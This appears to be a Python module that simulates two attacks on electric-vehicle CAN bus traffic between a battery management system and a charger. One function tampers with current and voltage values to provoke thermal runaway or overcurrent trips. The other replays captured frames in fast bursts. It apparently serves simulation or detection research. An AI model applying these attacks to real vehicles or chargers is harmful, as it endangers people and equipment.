"""Cyber-attacks targeting EV CAN Bus communications between BMS and EVSE."""

import struct

import can


def inject_value_tampering(
    original_msg: can.Message,
    tampered_current_a: float = 550.0,
    tampered_voltage_v: float = 750.0,
) -> can.Message:
    """Tamper with physical payload values in a legitimate BMS CAN message.

    Simulates an adversary injecting maliciously high current/voltage requests
    to induce thermal runaway or inverter overcurrent trip.
    """
    raw_current = round(tampered_current_a / 0.1) & 0xFFFF
    raw_voltage = round(tampered_voltage_v / 0.1) & 0xFFFF

    tampered_data = bytearray(original_msg.data)
    tampered_data[0:2] = struct.pack("<H", raw_current)
    tampered_data[2:4] = struct.pack("<H", raw_voltage)

    return can.Message(
        arbitration_id=original_msg.arbitration_id,
        data=bytes(tampered_data),
        is_extended_id=original_msg.is_extended_id,
        timestamp=original_msg.timestamp,
    )


def inject_replay_attack(
    recorded_buffer: list[can.Message],
    replay_start_time: float,
    burst_period_s: float = 0.015,
) -> list[can.Message]:
    """Replay a buffer of previously captured CAN frames with anomalous timing.

    Replays messages with a fast burst interval (e.g. 15 ms instead of nominal 100 ms)
    to flood the charger buffer or force a stale State-of-Charge estimate.
    """
    replayed_msgs: list[can.Message] = []
    current_time = replay_start_time

    for msg in recorded_buffer:
        replayed_frame = can.Message(
            arbitration_id=msg.arbitration_id,
            data=bytes(msg.data),
            is_extended_id=msg.is_extended_id,
            timestamp=current_time,
        )
        replayed_msgs.append(replayed_frame)
        current_time += burst_period_s

    return replayed_msgs
